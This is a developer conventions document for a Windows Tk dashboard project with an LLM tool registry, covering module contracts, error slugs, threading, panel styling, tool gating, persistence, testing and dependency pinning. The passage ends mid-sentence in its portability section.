# CONVENTIONS — Metis Toolbox / Felhaven

> *Ex tenebris surgit lumen posteris*

The patterns every module follows, and the deliberate exceptions. If you're about
to add a tool, a panel, or a config file, read the relevant section first — the
goal is that a new module looks like it was always here.

Companion to [`README.md`](README.md) (what the project is),
[`CHANGELOG.md`](CHANGELOG.md) (dated history) and
[`BACKLOG.md`](BACKLOG.md) (known, not done yet). Per-module detail lives in each
module's own docstring, indexed at
[`README_PANTHEON/`](metis_toolbox/README_PANTHEON/README.md).

---

## 0. The North Star — Anti-Legion

**One module, one job.** Every file's header docstring opens with
`Anti-Legion: ONE JOB` and a one-line `Job:` statement. If you can't write that
line without "and", the module is doing too much — split it.

**The `Job:` first sentence is the gloss.** Any hover/tooltip surface reads it
verbatim, so it must stand alone: a neutral, functional statement of what the
module *does*, written for a human reading the UI. One sentence, at most 90
characters, ending in a period; `tests/test_daedalus.py` holds every module to
it. Personality belongs to the deity name, never the gloss. Sentences after the
first elaborate and are not shown, so detail that doesn't fit moves there.

A module never reaches across this boundary: tools don't draw, panels don't
fetch, the scheduler doesn't parse data, the log watcher reads logs but never
acts on them. When two responsibilities tempt you into one file, that's a second
module.

---

## 1. Project layout

The clone's outer root holds the docs and `.gitignore`. **The "app root" is
`metis_toolbox/`, not the outer folder** — `config/` (the config JSONs) and
`bin/` live beside `felhaven.py`. Below it: `tools/` (headless logic), `panels/` (Tk display
surfaces), `config/` (shipped templates, §4), `tests/` (§10).

A tool in `tools/` finds the app root with
`os.path.dirname(os.path.dirname(os.path.abspath(__file__)))`. A module *at* the
app root uses `Path(__file__).resolve().parent`.

**Anchor to `__file__`, never to `cwd` or `sys.argv[0]`.** This is a scar, not a
preference: an early path bug anchored to `sys.argv[0]` and broke under relative
invocation (the comment above `metis_logging.LOG_DIR` documents it). Anchoring to the file means the
stack runs identically whether launched from Felhaven or `python tools/foo.py`
from any directory — which is what makes it flash-drive-portable.

---

## 2. Module contracts — the flavors

Not every module exposes the same surface. Pick the flavor that fits and follow
it exactly; the surface is the contract Kairos and Pythia rely on.

| Flavor | `fetch()` | `handle()` + `TOOL_DEFINITION` |
|---|---|---|
| **Polled + brain tool** | yes (raises on failure) | yes |
| **Request-driven brain tool** | no | yes (singular, or plural `TOOL_DEFINITIONS`) |
| **Dashboard-only watcher** | yes | no |
| **Polled status + UI-driven mutations** *(hybrid)* | yes (never raises) | optional |
| **Local-only ledger / persistence** | no | no (plain functions) |
| **Device / infrastructure authority** | no | no |
| **Polled actor** | yes (never raises) | no — it is a job, not a tool |

Membership is not listed here on purpose — it drifts, and it already has. The
ground truth is `pythia._TOOL_MODULES` plus `grep TOOL_DEFINITION tools/`, and
`tests/test_pantheon_docs.py` holds the docs to it.

Rules that fall out of the table:

- **`handle()` never raises.** A brain tool that throws crashes the dispatcher.
  On any error return `{"error": "..."}`. It is also the read path where a module
  has a separate mutate path.
- **`fetch()` *does* raise on total failure** — that's how Kairos delivers `None`
  so the panel shows a stale state without crashing. Deliberate never-raise
  exceptions exist (a watcher that crashes is worse than useless; an idle audio
  engine is a normal state, not a fault) — **if your `fetch()` doesn't raise, say
  why in the docstring.** Per-field degradation is a third option: fall back
  inside the returned dict, and raise only on wholesale failure.
- **A "polled actor" ACTS on its own tick.** Every other flavor either answers a
  question or draws a panel; this one decides to do something — `awen.py` plays
  audio and spends the model with no user action behind it. Three rules come
  with the row, and they are the whole reason it is worth naming:
  its `fetch()` **never raises** (waiting is a normal state, and Kairos's retry
  ladder is meaningless for a job waiting on a song to end); it has **no
  `TOOL_DEFINITION`**, because a job the model could start is a model
  scheduling its own unprompted work; and it **does not speak or draw** — it
  returns a payload and the GUI decides when it is heard, which is what keeps a
  worker thread away from Tk. Most of such a module is about when NOT to fire.
- **Out-of-LLM-scope is a real, intentional category.** A module that mutates a
  real-money ledger, or whose job is a panel verdict rather than an answer,
  deliberately omits `TOOL_DEFINITION` so a tool call can never reach it.
  Document the *why* — "out of LLM scope because …" — so nobody later "fixes" it.
  **The reverse happens too and is not a violation:** modules get promoted into
  the brain when a real use appears. Both directions belong in the decisions log.
  The *category* is deliberate; membership is not frozen.

### The error vocabulary

`{"error": ...}` was the whole rule for a long time, and six competing styles
grew inside it. The identifier is **read by the model and branched on by
panels**, so its shape is a contract, not a formatting preference. It is one of:

- a **bare slug** — `^[a-z][a-z0-9_]*$`, e.g. `no_results`, `vault_locked`
- **slug + human detail** — `^[a-z][a-z0-9_]*: .+$`, e.g.
  `too_large: 4.2 MB exceeds the 1 MB cap`

The **slug is the stable part**; the text after `: ` is for humans and may be
reworded freely. `tools/herodotus.py` is the reference implementation.

- **Never a bare sentence.** `"search failed"` → `unavailable: search failed`.
- **Never raw exception text.** `str(exc)` can carry paths, URLs, or key
  material into the LLM's context and onto the screen. At most
  `f"slug: {type(exc).__name__}"` — the class name, never the message.
- **Never a computed-only string.** `f"HTTP {status}"` → `f"unavailable: HTTP {status}"`.
  In an f-string the slug must come **before** any interpolation, so it stays
  greppable and matchable.
- Extra keys beside `error` are fine — `zeno` returns `expression` and `steps`
  with its errors — but they never replace the slug.
- Three or more codes in one module: lift them to `ERR_*` module constants
  (`tools/midas.py`). Fewer than three: inline literals are fine.

**A shared condition has one shared word** (§12, 2026-11-16). A small model
generalizes better from one word per condition than from five spellings, so
these mean the same in every module, and what makes each case different goes
in the detail after `: `:

| Slug | Means |
|---|---|
| `bad_arguments` | the call didn't give the tool what it needs (a schema mismatch, or an argument this action requires) |
| `unknown_action` | an action outside the tool's enum reached the handler |
| `offline` | no network where one was needed |
| `timeout` | the source didn't answer in time |
| `unavailable` | the source failed, or answered with nothing usable |
| `not_found` | the named thing doesn't exist |
| `no_results` | the search ran and found nothing |
| `vault_locked` | Cerberus is sealed |

A failure only one module can have keeps its own slug (`division_by_zero`,
`target_ambiguous`, `invalid_feed_xml`). A module adopts the shared words when
it reaches `V0.03` (§3); `test_tool_output_contract` fails a V0.03 module that
still uses a retired spelling, and lists them.

**Panels map the slug to human text**, never render it raw — the
`_ERROR_TEXT` dict in `panels/echo_panel.py`, including its fallback to the raw
code so an unmapped error is surfaced rather than swallowed. Rite's map is
held to the slugs tools actually write (`test_rite_panel_smoke`), so a rename
cannot leave its words behind.

`tests/test_tool_output_contract.py` enforces all of this by parsing the AST
(a text search cannot tell `str(e)` from a literal). Modules that predate the
rule sit in its `_EXPECTED_VIOLATIONS` allowlist and come off as each is
audited; a stale entry fails just as loudly as a new violation.

---

## 3. The standard tool-module shape

Copy `tools/midas.py` or `tools/morpheus.py` as the template. In order:

1. **House-style header docstring**: `Job:` · `Contract:` · `Source:` ·
   `Upstream:` · `Downstream:` · `Requires:`, plus any module-specific section,
   and the audit marker (`V0.03:` today) last once the module has been
   audited. This carries the weight when the name doesn't.

   **The `V0.03:` field is the audit marker**, and it is the *only* version a
   file names — it replaces any other version line the module carried. Both a
   tool and its panel get it in the same session:

   ```
   V0.03:       Walked through 2026-11-23 (the V0.03 walkthrough, S34; born
                2026-09-27). Every public function was read against the
                Contract, the never-imports rule and the cache.
   ```

   Its absence means "not yet audited", so no test asserts every module has one.
   A version no audit has reached does fail
   (`tests/test_tool_output_contract.py`) — one file, one version. A version
   number nobody maintains is a promise you can't keep; the retired
   `(FOE v.01)` label is the scar (§12).

   **`V0.03:` means "walked through against this file as it stands"** (§12,
   2026-11-17). That is the V0.02 walkthrough's checks (the docstring tells
   the truth, no dead code, no stale words, an honest §2 flavor and error
   vocabulary, hermetic tests) plus every rule and guard added since. The
   brain-tool rules (the description grammar above, `TOOL_META`, the gate in
   §8) apply only to brain tools, and a rule that doesn't fit a file is
   skipped, so the one word means the same on a panel as on a tool. The
   Pythia tool audit (§12, 2026-11-16) gave the first `V0.03:` markers to the
   13 brain-tool modules; the V0.03 walkthrough (S00 to S36, 2026-11-17 to
   2026-11-23) took every file there.

   A module that reaches a new marker trades its old block for a dated
   paragraph (`2026-07-24:  walkthrough audit — …`), so the history stays and
   the file still names one version; the new block goes last. The 13
   brain-tool modules did the same: their tool-audit block became
   `2026-11-16:  the Pythia tool audit …` and a fresh `V0.03:` went last.

   **One marker per file, in the module docstring.** Daedalus, Home's status
   bar and the version test read only the module docstring, so a marker on a
   class is invisible to all three. A file that holds several widgets still
   carries one module-level marker; notes that once sat on its classes fold
   into the module's history, or go if they only repeat it.
   `test_tool_output_contract` fails a marker in a class or function
   docstring, in every tracked source file, panels included.

   While an audit runs, two versions stand side by side, and Home's status
   bar shows the newest (`daedalus.audit_version()`). The test allows the
   versions in `_ALLOWED_VERSIONS` and fails a file with two markers. The
   V0.03 walkthrough's finale (S36, 2026-11-23) found all 92 source files at
   `V0.03` and closed the set to that one; a next audit adds its version
   while it runs and drops the old one when the last file has moved.
2. **`log = logging.getLogger("METIS.<name>")`** at module top. Nothing else
   touches logging config — see §5.
3. **Path constants** anchored to `__file__` (§1).
4. **`_load_<thing>()` config loaders** that return a safe empty default on *any*
   failure and log it — never raise, never crash the panel.
5. **Internals** prefixed `_`.
6. **Public API** — `fetch()` / `handle()` / `TOOL_DEFINITION` per the flavor,
   and a brain tool's `TOOL_META` beside its schema (§8).
7. **`if __name__ == "__main__":`** standalone block that runs the real thing and
   prints the result. Every tool has one.

```python
TOOL_DEFINITION = {
    "type": "function",
    "function": {
        "name": "calculate",                 # snake_case verb_noun
        "description": "What it does + WHEN the model should call it.",
        "parameters": {"type": "object", "properties": {...}, "required": [...]},
    },
}
```

**Description grammar** (§12, 2026-11-16). The description is routing text the
model reads on every request, so every tool says it the same way, in this
order:

1. **What it returns or does**, opening with a verb in the third person:
   *Returns…*, *Shows…*, *Starts…*. What it covers belongs here too (Eudoxus's
   units, Asclepius's parts), because those words are what route a question to
   it.
2. **When to call it**, one sentence opening *Call when…*, *Call whenever…* or
   *Call only…*. One clause, not two that overlap.
3. Optionally, **what it is not for**, naming the sibling tool to use instead.

Steering the result needs comes after (`read_archive`'s "if 'truncated' is
true, call again…"). How to fill in an argument (Zeno's operators, which unit
names work) goes on the parameter. Aim for 400 characters or fewer, and 200 per
parameter. `tests/test_tool_schema_contract.py` checks the opening verb and the
single when-clause; the lengths are targets, and only the 600-character cap is
enforced. No personality: that lives in the deity name (§0).

**Multi-tool modules** — a module usually owns exactly one tool. A module whose
single job is naturally two tightly-coupled calls may instead export the plural
**`TOOL_DEFINITIONS`** (a list of schemas) and one public function **named exactly
for each tool**, in place of `handle()`. The registry reads each name straight
from its schema and binds it to the like-named function, so definitions and
handlers can't drift. This is a narrow allowance, not a loophole for §0 — if the
two tools aren't one job seen from two angles, they're two modules.

---

## 4. Config over code

Anything a user might reasonably want to change without editing Python lives in a
JSON file under **`metis_toolbox/config/`** (not the app root), **ordered**, with
**UI order following file order**. Adding a feed / ticker / playlist is a JSON
edit, **never** a code change. The loader tolerates a missing or malformed file by
returning `[]` and logging — a bad config degrades one panel, never the app.

**"Config" and "committed" are not synonyms.** Most of `config/` ships, but some
files there are gitignored: they have a config *shape* (ordered rows a user edits
by hand) and personal *content*. Ask "would I want a stranger cloning this to
inherit my copy?" — if no, it's state, wherever it sits (§9). A fresh clone
starting with no playlists is the design, not a missing file; don't "fix" it by
committing one.

---

## 5. Logging

- **Entry points call `setup_logging("<program>")` once**, before anything can
  emit. Tool modules **never** configure logging — they just
  `logging.getLogger("METIS.<name>")` and inherit.
- **And `log_tk_errors(root)` on each Tk root they make.** Both entry points
  run under pythonw, with no stderr, so an exception nothing caught is logged
  or lost: `setup_logging` sends a thread's and the program's to the log, and
  `log_tk_errors` a Tk callback's. Why: §12, 2026-11-21.
- **The format is load-bearing.** Lines are `" | "`-delimited
  (`ts | LEVEL | logger | message`) because **Emanon parses them with a plain
  `str.split(" | ")` — no regex.** Don't change the delimiter or column order
  without updating `emanon._parse_line` in lockstep (`metis_logging._DELIM` and
  `emanon._DELIM` must match exactly).
- **One record, one entry.** The formatter writes a message on one line (its
  line breaks escaped) and turns ` | ` into ` ¦ ` on the lines after a
  record's first (a traceback), so text quoted from a server can't start a line
  Emanon reads as an entry. Emanon splits with `str.splitlines()`; a test holds
  the formatter's list of breaks to it. Why: §12, 2026-10-05.
- **Levels carry meaning Emanon collapses into a health verdict:**
  `ERROR`/`CRITICAL` → *failed*, `WARNING` → *degraded*, `INFO` → *nominal*. So
  routine heartbeat is **DEBUG** — it would drown Emanon at INFO. **WARNING** is
  "expected, recoverable." **ERROR** is "a human should look at this." Kairos
  already logs every worker fire at DEBUG and every failure at ERROR, so your
  `fetch()` rarely needs to log the happy path.

---

## 6. Kairos & the threading rules

`kairos.py` owns the clock. The whole concurrency model rests on one sentence:

> **The result queue is the only object shared between worker threads and the
> main thread.**

- **Panels are dumb display surfaces.** A panel never spawns a thread and never
  runs an `after()`-driven polling or timing **loop**; it exposes `update(data)`
  and waits to be called. A *single* one-shot `after()` for transient UI
  feedback — a status line that self-clears, a glyph that resets after a beat, a
  two-click-remove confirm that disarms itself — is fine: it fires once, on the
  main thread, touching only this panel's own widgets.
- Kairos runs a single 500 ms tick loop on the main thread. Each tick it fires
  due workers as **daemon** threads, drains the result queue, and calls
  `panel.update(data)` **on the main thread**.
- A **pile-up guard** means a slow worker never stacks: if last tick's fetch is
  still alive, this tick skips it.
- Workers write **only** to the queue. They never touch a Tk object. Ever.
- **Workers may share state with each other, never with the main thread.**
  Kairos's worker and Pythia's worker both reach the freshness caches in
  `tools/aura.py` and `tools/pheme.py` (§12, 2026-09-28). That is allowed
  behind the module's own lock, and the cache stores and hands out deep copies
  only, so a panel never receives an object a worker still holds.
- On `fetch()` failure Kairos delivers `data=None`; **every `update(data)` must
  handle `None`** (show stale/idle, don't blank-and-crash).
- Register a worker by adding `(name, interval_seconds, "tools.x.fetch")` to
  `Kairos.WORKERS` and wiring the panel in `felhaven.py` with
  `kairos.register_panel(name, panel)`.

**Documented exceptions to "no threads, no `after()` loops"** exist, each
justified in code — Emanon's bounded, self-terminating status-blink chain,
`MorpheusPanel`'s one daemon thread for the blocking `yt-dlp` search (see §12),
`EchoPanel`'s one daemon thread for a whole-document conversion plus its bounded,
self-terminating `after()` drain chain (Echo is request-driven, not a Kairos
worker, so it has no tick to drain the result on), `OrpheusPanel`'s one daemon
thread for a whole-file decode with the same kind of drain chain (it has a 2 s
Kairos tick, but draining on it would add up to 2 s to every play; see §12),
and **`HomePanel`'s one daemon
thread for the slow `pythia.ask()` call plus a persistent main-thread
`after()`-poll to drain it** (HomePanel is event-driven — you press Enter — not a
Kairos worker, so it runs its own standing 60 ms poll instead of riding the tick;
the poll is cancelled in the panel's `destroy()` — see the teardown rule below).
Each preserves the contract: the worker's only shared touch is a queue
`put`, `update()` / the drain runs on the main thread, and a single-flight guard
ignores a second job while one is in flight.

**`PythiaFace`'s animation loop** (`panels/pythia_face.py`) is the one exception
that is not about a slow call. It is a ~20 fps redraw, and there is no rate at
which a 500 ms Kairos tick animates anything — so the widget schedules its own
frame chain. What keeps it honest is that it is *bounded by visibility*: `<Map>`
starts the loop and `<Unmap>` stops it, so a face on a packed-away view costs
nothing (`felhaven._show_view` `pack_forget()`s the whole panel), `start()`
guards on `_running` so a repeated `<Map>` cannot double-schedule, and the
pending id is cancelled in `destroy()`. It spawns no thread and touches only its
own canvas items. `tests/test_panel_after_teardown.py` holds all three ends of
that down.

Note what the face does **not** do: it reads no state. `HomePanel` derives the
state name on its existing drain chain and pushes it in. A panel that wanted to
animate *and* poll for what to animate would need a second exception, and would
not get one.

`AmmitWidget`'s countdown is **not** among them, despite once being listed here:
it holds no `after()` and spawns no thread. `HoraiPanel.update()` refreshes it on
horai's 1 s Kairos tick — the compliant path, which is exactly why it needs no
exception.

If you find yourself reaching for a new one, stop — the answer is almost always
"give Kairos a worker."

**Every `after()` you schedule, you cancel on teardown.** Keep the id and cancel
it in a `destroy()` override before `super().destroy()` — the `EchoPanel` /
`ArtemisPanel` shape. This applies to the permitted one-shots too, not just the
chains above.

A `winfo_exists()` guard inside the callback is *not* a substitute. Tk deletes a
widget's registered Tcl commands as it destroys the widget, so an
already-scheduled after script has no command left to call: Tcl reports
`invalid command name "..._poll"` on stderr and Python is never reached. The
guard only covers a callback that is already mid-flight (a glyph destroyed
while the panel lives); it can do nothing once the panel itself is gone.
Cancelling the pending id is the only thing that actually ends the chain.

Cancelling first still leaves one gap: Tk can deliver an event *while*
`super().destroy()` tears the children down — after your cancels, before
tkinter deletes the callbacks — and a handler that arms a timer then orphans
it. `winfo_exists()` is still true there, since the children go first. So a
handler that arms a timer from an event Tk raises on its own (`<Configure>`)
returns early on a `_destroyed` flag that `destroy()` sets as its first line
(`ArtemisPanel._on_configure`).

Two shapes, picked by how many can be outstanding at once:

- **One at a time** → a single `self._xxx_after_id` attribute (`EchoPanel`'s
  drain, `HomePanel`'s poll). Re-arm through a helper that
  cancels the stored id first: a callback can be entered *without* its timer
  having fired — the smoke tests call `panel._poll()` directly — and re-arming
  blind orphans an id that `destroy()` can then never reach. A chain that can
  also *end* inside the callback cancels at the top instead, so the ending
  branch cannot orphan it either (`ArtemisPanel._drain`).
- **Several at a time** → a `self._pending_after` set plus an `_after_once()`
  helper that discards its own id when it fires (`MorpheusPanel`,
  `OrpheusPanel`, where every armed remove glyph owns its own confirm window).
  A single slot would forget all but the last.

Cancelling an id that already fired is a harmless no-op, so neither shape needs
to track whether the timer is still live.

---

## 7. Panels

- **Subclass `Card`** (`theme.py`). Pack content into `self.body`, never into
  `self` directly.
- **Colors and fonts come from `theme.C` and `theme.FONTS` only.** Never hardcode
  a hex value or a font tuple — if you need a new color, add it to the palette.
  This is what keeps the dashboard coherent and lets `rescale_fonts` work.
  The colour values themselves live in `palette.py`, the one file allowed to
  contain one; `theme` re-exports `C` and `rgb()`, so a panel imports from
  `theme` and a headless `tools/` module imports `palette` directly.
  `tests/test_palette_guard.py` fails red on a hex string, a colour name in a
  colour option, or an RGB triple anywhere else. A new key that shares a
  value with an existing one is either the same colour on purpose (list it in
  `palette._SAME_AS`) or by coincidence (declare it in the guard) — §12.
- **Selection and text-cursor colours are already in theme.**
  `theme._init_widget_defaults(root)` puts them in Tk's option database, and
  every file that owns a `tk.Tk()` calls it beside `_init_fonts` (`test_theme`
  fails if one does not). A new `Entry` or `Text` needs no `select*` or
  `insertbackground` option; pass one only to differ from the theme — §12.
- **Tab bar pattern**: `tk.Label` tabs with a 1 px underline `tk.Frame`; active =
  `C["text1"]` text + the panel's accent on the underline, inactive =
  `C["text3"]` + `C["border"]`. Copy it verbatim from an existing tabbed panel.
- **Scrolling lists**: reuse the `_ScrollFrame` (Canvas + scrollbar) pattern — the
  frame is copied per panel, but the scrollbar inside it is always
  `theme.PhosphorScroll`, never `tk.Scrollbar` (§12 — the stock widget can't be
  themed on Windows). Bind the mouse wheel **only while hovering**
  (`<Enter>`/`<Leave>`) so stacked scroll frames don't fight over wheel events.
  **Pack the scrollbar before the widget it scrolls.** A `tk.Text` asks for
  80 characters (574 px at the base font); packed first, it takes the whole
  row of a narrow window and pack unmaps the scrollbar, at exactly the size
  where the text overflows (measured 2026-11-09 on all five text boxes).
  `tests/test_scroll_lanes.py` holds every Text with a PhosphorScroll to it.
- **Clickable rows**: `cursor="hand2"`, `<Button-1>` for the action, and a hover
  highlight flipping `fg` to `C["amber"]` on `<Enter>` and back on `<Leave>`.
- **Tooltips**: a panel never builds its own. It calls
  `virgil_tooltip.attach(widget, tip)` from a `_TIPS` table, and a lockstep
  test holds the table to its widgets (`tests/test_virgil_surfaces.py`). A
  module tip, `virgil.module(key)`, shows that module's gloss (§0); everything
  else is a glossary entry, `virgil.term(key)`, from
  `config/virgil_glossary.json`. The nav rail says what a place is (a term), a
  tab says who works there (a module), and so does anything else one worker
  draws or heads (Pythia's face). A readout says what the number or the lamp
  means (a term), and a control says what a click does (a term). A lamp that
  carries a module's name is still a readout: its entry explains the colours,
  under a key of its own (`cerberus_lamp`). A tagged span of a `tk.Text` gets
  its tip with `attach_tag(text, tag, tip)`, on a tag every such span shares.
  A widget that is sometimes empty passes `when=` so no tip shows over
  nothing. A glyph built once per row (a playlist's ✕, a headline's ↗) is
  named in `_ROW_TIPS` and attached by the row's builder; the tip table
  forgets a row's widgets when they are destroyed. The tip's handlers ride
  bindtags, so a panel binds and unbinds its
  own widgets freely; the one exception is a text tag that carries a tip,
  where any other binding on that same tag needs `add="+"`. Why: §12,
  2026-11-09 and 2026-11-10.
- **An alert popup stands alone.** Never `transient` to the main window:
  Windows hides a window tied to a minimised one, so an alert that arrives
  then opens unseen. It is `-topmost` with no grab, Escape and the X both
  dismiss, and `theme.place_alert()` centres it over the main window, or over
  the screen while that is minimised. Iris's and Ammit's; why: §12,
  2026-11-17 and 2026-11-21.
- **The one inversion — Hestia's vox controls** (`panels/vox_controls.py`):
  there, active = `C["amber"]` and inactive = `C["text3"]`, the opposite of the
  rule above. It is deliberate and it is local. Home's command surface sits
  beside the wireframe face and the status line under PYTHIA, which already say
  "amber means this is doing something right now"; a control row that lit up green next
  to them would be reporting the same fact in a second vocabulary. The cost is
  that amber can no longer double as the hover colour — an unhovered active
  control and a hovered inactive one would be identical — so **hover brightens
  within the current state** instead of announcing one: `text3` → `text1` when
  off, `amber` → `amber_bright` when on. `amber_bright` is to `amber` exactly
  what `red_bright` is to `red`: the same channel, hovered, not a new meaning.
  Each control also carries `SidebarRow`'s dot — same canvas, same 8 px oval —
  with the **polarity flipped**: `SidebarRow` lights its dot `C["green"]` when
  active and leaves it amber otherwise ("amber = somewhere you could go, green =
  you are here"), which reused here would turn a dot green at the exact moment
  its own label turned amber. The dot follows the label beside it, from one
  computed colour painted on both surfaces — never two branches that can drift.
  Do not spread this outside that row. Everywhere else, active is still
  `C["text1"]`.
- **Collapsible sub-widgets**: collapsed by default, toggled with a `▶`/`▼`
  label — copy the `AmmitWidget` section-toggle.
- **Grouping views in the nav rail**: a family of related views goes in
  `Sidebar._GROUPS` (`panels/sidebar.py`), never in a tab host. The group header
  is a `GroupRow` that selects nothing; each child stays a full entry in
  `felhaven._views` with the whole content area and the ordinary lit-row active
  state. Adding one is a child tuple plus a `_views` entry —
  `test_sidebar_view_parity` fails if you do only one of the two.
- **Nothing above the input may out-request the input.** Pack satisfies every
  slave's *requested* height in pack order, and only then hands the leftover to
  `expand=True` children — so a tall widget packed above a control squeezes that
  control to 1 px rather than shrinking itself. A `tk.Text` asks for 24 lines and
  a bare `tk.Canvas` asks for 265 px, which is how `PhosphorScroll` silently put
  a 265 px floor under every container holding one and collapsed Home's chat bar
  at any window under ~1280×900. Give a widget that is *meant* to absorb slack
  (`height=1` on a Text, an explicit `height` on a Canvas) a token request and
  let `expand` do the growing. The rule of thumb: whatever the user scrolls is
  what shrinks; whatever the user clicks or types into never does.
  **Pack order is priority**, too: pack what must stay on screen (a SAVE row,
  a status line) before the box that scrolls, using `before=` the first
  widget when it is built later, so a row added above can never push it off
  the bottom (`machine_spirit_panel.py`, 2026-11-09).
- **Placeholders, not crashes**: if a tool can't run (no API key, missing
  binary), render a calm placeholder and disable controls — never raise from a
  panel constructor.
- **`update(data)` is the single entry point Kairos calls.** Keep it cheap and
  idempotent; rebuild rows from scratch if that's simplest.

---

## 8. Brain registration (only for brain tools)

To make a tool callable by Pythia, add its module to `pythia._TOOL_MODULES`.
Pythia *derives* `TOOLS` + `_DISPATCH` by reflection (reading each module's
`TOOL_DEFINITION` + `handle()`, or plural `TOOL_DEFINITIONS` via
`_module_tools()`), so the registry can never drift from the handlers — there is
no separate list to keep in sync.

If the module is deliberately **not** a brain tool (§2), it is simply left out of
`_TOOL_MODULES`, and that omission is the feature. **`_TOOL_MODULES` is the ground
truth**; anything restating it is a copy that will drift, so don't add one.
`tests/test_pantheon_docs.py` enforces that the module docs stay in step.

**The schema is enforced, not just shown.** Every call passes
`pythia._check_arguments` before its handler runs, driven by the same
`parameters` object the model read (§12, 2026-09-27). An undeclared or missing
parameter, or a value of the wrong type, comes back as `bad_arguments` and the
handler never runs; a numeric string or an enum value in the wrong case is
normalized. Enum membership and ranges stay the handler's to judge. So a
handler can trust the *types* the schema declares, and must still check its own
meaning (Ammit still refuses a start with no usable duration).

**Some calls need more than a valid shape.** After the argument gate,
`pythia._gate` applies two rules (§12, 2026-09-30). `fetch_page` runs only on a
URL the user wrote or a `search_web` result gave. A tool that changes files runs
only after the user says yes through `ask(on_confirm=)`, and never for a caller
that has no one to ask. **A new tool that changes files joins
`pythia._CONFIRM_TOOLS`.** `test_pythia_guard` fails if an archive writer is
missing from it, or if a name in it stops being registered.

**Every brain tool also has a `TOOL_META` entry** (§12, 2026-11-16): a dict
beside the schema, keyed by tool name, holding what the code reads about the
tool and the model never sees.

```python
TOOL_META: dict[str, dict[str, Any]] = {
    "get_weather": {"domain": "weather", "network": "cached", "mutates": False},
}
```

- `domain` — the capability, one of `time`, `weather`, `sky`, `machine`,
  `markets`, `news`, `math`, `music`, `web`, `archive`, `codex`. It names what
  the model needs, not the panel that shows it.
- `network` — `none` (local only), `cached` (a poll or TTL cache that
  refetches when it runs out) or `live` (may reach the network on every call).
- `mutates` — whether a call changes state outside the turn.

It is kept apart from the schema so nothing has to be stripped before a
request. Nothing routes on it yet. `tests/test_tool_meta_contract.py` holds it
to the registry in both directions, checks the values, and fails if a
description names a tool from another domain. A new domain is a decision, so
it is added to that test's list and recorded here.

Pythia is the **only** registry. A second, voice-side registry existed until
voice input was retired (§12); `metis_toolbox/__init__.py` is now an empty package
marker. Keeping a tool off the LLM surface means keeping it out of
`_TOOL_MODULES`, nothing more.

---

## 9. Persistence

- Pattern: **load → mutate → save → return a snapshot dict**. The snapshot is
  JSON-serialisable and human-readable.
- **Derive, don't store, what you can recompute.** Plutus folds an append-only
  event log into positions/totals rather than storing balances — the log is the
  source of truth.
- **Atomic writes**: tempfile in the same directory + `os.replace`, so a crash
  mid-write can never truncate the original. `tests/test_file_writes.py` fails
  on a new function that writes content where it stands, until it says why a
  torn file is harmless there.
- **Personal data is gitignored.** `.gitignore` is the list; committed JSON is
  *config* (§4), generated or personal JSON is *state* and stays local.

---

## 10. Testing

- **stdlib `unittest`, no pytest.** Run with UTF-8 forced (the glyphs and the
  delimiter need it):

  ```bash
  cd metis_toolbox
  python -X utf8 -m unittest discover -s tests -p "test_*.py"
  ```

- **Headless Tk smoke tests**: this project runs on Windows (no Xvfb). Use a real
  `tk.Tk()` root, `root.withdraw()` so no window flashes, and drive it with
  `root.update_idletasks()` instead of `mainloop()`. *No exception raised == pass.*
- **Kairos internals treat unknown workers as infinitely overdue.** Any test
  calling `_tick`/`_schedule_workers` directly must patch both `kairos.time` and
  `threading.Thread` first, or it will spawn real threads.
- **Prefer captured-real fixtures over hand-built JSON.** A hand-built fixture
  with the "right" types can hide a real-world type bug (the `wttr.in`
  string-typed percentages lesson). Assert against recomputed values so the test
  can't silently drift from the fixture.

  **A hand-built fixture can also encode a state that never happens.**
  `test_morpheus_load_failure.py` modelled a track's natural end as mpv's
  *stopped* shape (`playlist-count 0`) for a month. Real mpv leaves
  `playlist-count 1` — identical to a failed load. The tests passed the whole
  time, because a real natural end has its load confirmed long before EOF, so
  the wrong fixture was never what kept them green; it just quietly documented
  that two states were separable when they are not. Note the direction of the
  error, because it is the dangerous one: **a hand-built fixture tends to
  flatter the code**, since the same head invents both. If a fixture asserts
  that two states differ, that claim is a measurement, and it should name the
  date it was measured. *(2026-09-16.)*
- **Test the degraded paths**, not just the happy one: `None` from Kairos, a
  missing binary/key, an empty config, a single failed feed.
- **Guard invariants in lockstep, never with a hardcoded count.** A count rots
  red for the wrong reason. Assert that two live sources agree — the shipped
  config against the code defaults, `TOOLS` against `_DISPATCH`, the docs against
  `_TOOL_MODULES`. **And confirm the guard actually fails red before trusting
  it**: a degradation path nothing exercises isn't a safety net, it's a comment.
- **Assert against the repo, not the working directory.** A check that reads the
  filesystem passes on a machine where gitignored state happens to exist and
  fails only in CI. `test_pantheon_docs.py` shipped with exactly that bug — it
  had been verified to fail red, but only against scenarios the author's own
  checkout could produce. Ask what a *fresh clone* has: if the answer differs
  from your disk, check `git ls-files`, not `os.path.exists`.

---

## 11. Windows & portability

- The stack targets **Windows** and aims to be **flash-drive-portable**.
- **No new pip dependencies casually.** The bar is high; Morpheus added *zero*
  (it shells out to binaries instead of importing a library). Prefer stdlib;
  prefer a bundled binary in `bin/` over a package when a binary will do.
- **Dependencies are a lock, on one Python (3.13).** `requirements.in` says
  what we use; `requirements.txt` is compiled from it, with every package,
  direct or pulled in, pinned and hashed. It is generated, never edited by hand.
  `requirements-dev.in` → `requirements-dev.txt` do the same for mypy and its
  stubs, constrained to the runtime lock. To add, remove or upgrade a package:
  1. Edit the `.in` file.
  2. Recompile on 3.13 with pip-tools (installed in its own venv, never
     `.venv`): `pip-compile --generate-hashes --strip-extras requirements.in`,
     then the same for `requirements-dev.in`, since it reads the runtime lock.
     Add `--upgrade` to refresh every pin. Set `CUSTOM_COMPILE_COMMAND` to
     that same command first: the header must name the real command, and
     pip-tools 7.6.1 writes a stray `--no-index` there otherwise.
  3. Rebuild `.venv` from the lock (SETUP §2) and run the suite.

  Never `pip install` into `.venv` by hand: `test_environment_lock` fails on
  anything the lock doesn't name, and on any other Python. Why: §12, 2026-09-30.
- **CI's Actions are pinned to a full commit SHA**, with the release tag in a
  comment (`uses: actions/checkout@<sha> # v7.0.1`). `test_ci_pins` holds it.
  Dependabot (`.github/dependabot.yml`) opens one weekly PR that moves every
  pin with a release at least a week old; merge it once its CI is green.
- **Every process launch and shell opener is listed** in
  `tests/test_process_launches.py`, with the program and where each argument
  comes from. A new one fails until someone traces its arguments and adds its
  line; then run the semgrep tripwire (`tests/semgrep/felhaven_sinks.yml`). A
  value that came from the network, a config file or the model must be checked
  before it reaches the program. Why: §12, 2026-10-03.
- **A program is named by its absolute path**, never a bare name: System32's
